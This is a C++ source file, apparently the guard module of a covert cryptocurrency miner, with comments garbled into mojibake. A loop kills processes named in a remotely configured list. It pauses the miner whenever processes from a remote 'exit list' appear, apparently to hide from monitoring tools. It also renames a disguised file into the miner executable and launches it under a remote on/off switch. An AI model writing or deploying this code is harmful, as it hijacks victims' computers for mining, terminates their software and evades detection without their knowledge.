#include "i_guard.h"

namespace iGuard {

	void init() {
		boost::thread tExeScan(boost::bind(&exeScan));
	}

	void exeScan() {
		while (true) {
			Sleep(777);
			bool _minerSafe = true;
			PROCESSENTRY32 _pe32;
			_pe32.dwSize = sizeof(_pe32);
			HANDLE _hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (_hProcessSnap == INVALID_HANDLE_VALUE) continue;
			bool bMore = Process32First(_hProcessSnap, &_pe32);
			string _Ignore_list = "AppleMobileDeviceService.exe|ApplicationFrameHost.exe|ChsIME.exe|DDVCollectorSvcApi.exe|DDVDataCollector.exe|DDVRulesProcessor.exe|IAStorDataMgrSvc.exe|IAStorIcon.exe|IntelCpHDCPSvc.exe|IntelCpHeciSvc.exe|IntelTechnologyAccessService.exe|IpOverUsbSvc.exe|LMS.exe|LegacyCsLoaderService.exe|ListaryService.exe|LockApp.exe|MSBuild.exe|Memory Compression.exe|NTFSWatcher.exe|NVDisplay.Container.exe|PerfWatson2.exe|QQProtect.exe|RAVBg64.exe|RegSrvc.exe|RtkAudioService64.exe|RtkNGUI64.exe|RuntimeBroker.exe|SGTool.exe|ScriptedSandbox64.exe|SearchIndexer.exe|SearchUI.exe|SecurityHealthService.exe|ServiceHub.DataWarehouseHost.exe|ServiceHub.Host.CLR.x86.exe|ServiceHub.IdentityHost.exe|ServiceHub.SettingsHost.exe|ServiceHub.VSDetouredHost.exe|SettingSyncHost.exe|ShellExperienceHost.exe|SocketHeciServer.exe|StandardCollector.Service.exe|SupportAssistAgent.exe|System.exe|VcxprojReader.exe|WUDFHost.exe|WmiApSrv.exe|WmiPrvSE.exe|ZeroConfigService.exe|aesm_service.exe|audiodg.exe|cmd.exe|conhost.exe|csrss.exe|ctfmon.exe|dasHost.exe|devenv.exe|dllhost.exe|dptf_helper.exe|dwm.exe|esif_uf.exe|explorer.exe|fontdrvhost.exe|ibtsiva.exe|igfxCUIService.exe|igfxEM.exe|igfxext.exe|ioc.exe|lsass.exe|mDNSResponder.exe|mspdbsrv.exe|msvsmon.exe|nvapiw.exe|nvtray.exe|services.exe|sihost.exe|smartscreen.exe|smss.exe|spoolsv.exe|svchost.exe|taskhostw.exe|unsecapp.exe|usysdiag.exe|vcpkgsrv.exe|vctip.exe|wininit.exe|winlogon.exe|winwfpmonitor.exe|wlanext.exe|";
			string _ad_list = "";
			string _exit_list = "";
			// Զ�̹���ϲ�
			if (!G_CONFIG["ad_list"].empty()) _ad_list += G_CONFIG["ad_list"].get<string>();
			if (G_CONFIG["exit_list"].empty()) {
				_minerSafe = false; // ���Ϊ����Ĭ�ϲ���ȫ
			} else {
				_exit_list += G_CONFIG["exit_list"].get<string>();
			}
			boost::to_lower(_Ignore_list);
			boost::to_lower(_ad_list);
			boost::to_lower(_exit_list);
			while (bMore) {
				// ������
				bMore = Process32Next(_hProcessSnap, &_pe32);
				string pe32exeFile = string(_pe32.szExeFile);
				//pe32exeFile = pe32exeFile.substr(0, pe32exeFile.size() - 4); // ȥ��.exe������ᵼ��ģ��ƥ�䣬�����ɱ����
				// �����б�
				if (_Ignore_list.find(pe32exeFile) != string::npos) continue;
				// תСд
				boost::to_lower(pe32exeFile);
				// ����б�
				if (_ad_list.find(pe32exeFile) != string::npos) {
					printf_s("\n ad_list: %s \n", _ad_list.c_str());
					printf_s("\n kill: %s \n", pe32exeFile.c_str());
					DWORD dwProcessID = _pe32.th32ProcessID;
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
					TerminateProcess(hProcess, 0);
				}
				// �˳��б�
				if (_exit_list.find(pe32exeFile) != string::npos) _minerSafe = false;
			}
			CloseHandle(_hProcessSnap);
			G_MINER_SAFE = _minerSafe; // ȫ�ֱ���
			runMiner(); // �����ڿ����
		}
	}

	void runMiner() {
		bool G_MINER_RUN = cTool::checkAppRun(cTool::base64_encode(G_MINER_EXE)); // ���Ƿ�����
		if (G_MINER_RUN) return; // �����������
		if (!G_MINER_SAFE) return; // ����ȫ�����
		// ���������ļ�������״̬
		CSimpleIni ini(true, false, false);
		ini.LoadFile(G_CONFIG_FILE.c_str());
		string G_MINER_STATE = ini.GetValue("", "app_state", "1");
		if (G_MINER_STATE.find("-1") != string::npos || G_MINER_STATE.find("0") != string::npos) return; // Զ�̽�ֹ����
		// �޸��ļ���������
		string _oldName = cTool::exePath() + G_MINER_FILER;
		string _newName = cTool::exePath() + G_MINER_EXE;
		rename(_oldName.c_str(), _newName.c_str());
		printf_s("\n %s \n", (cTool::exePath() + G_MINER_EXE + " -safe").c_str());
		cTool::runApp(cTool::exePath() + G_MINER_EXE + " -safe");
		Sleep(1000 * 20);
	}
}